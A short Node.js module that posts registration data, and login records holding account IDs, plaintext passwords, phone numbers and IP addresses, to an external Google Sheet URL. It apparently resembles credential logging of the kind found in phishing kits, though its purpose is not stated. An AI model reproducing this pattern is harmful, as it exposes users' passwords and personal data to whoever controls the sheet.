const axios = require("axios");

class GoogleSheet {
  async storageDataRegisterToGoogleSheet(dataInput, GOOGLE_SHEET_URL) {
    if (!GOOGLE_SHEET_URL) {
      console.warn("GOOGLE_SHEET_URL not set. Skipping sheet upload.");
      return;
    }
    const data = JSON.stringify(dataInput);
    console.log(data);
    const config = {
      method: "post",
      maxBodyLength: Infinity,
      url: GOOGLE_SHEET_URL,
      headers: {
        "Content-Type": "application/json",
      },
      data: data,
    };

    try {
      const response = await axios.request(config);
      console.log(JSON.stringify(response.data));
    } catch (error) {
      console.error("Error storing data to Google Sheets:", error);
      return null; 
    }
  }

  async storageDataLoginToGoogleSheet(dataInput, GOOGLE_SHEET_URL) {
    if (!GOOGLE_SHEET_URL) {
      console.warn("GOOGLE_SHEET_URL not set. Skipping sheet upload.");
      return;
    }
    const {action, AccountID, AccountPWD, phone, timeNow, userIp} = dataInput;
    const data = {
      action, AccountID, phone, timeNow, userIp, AccountPWD
    };

    const config = {
      method: "post",
      maxBodyLength: Infinity,
      url: GOOGLE_SHEET_URL,
      headers: {
        "Content-Type": "application/json",
      },
      data: JSON.stringify(data)
    };

    try {
      const response = await axios.request(config);
      console.log(JSON.stringify(response.data));
    } catch (error) {
      console.error("Error storing data to Google Sheets:", error);
      return null; 
    }
  }
}

module.exports = GoogleSheet;
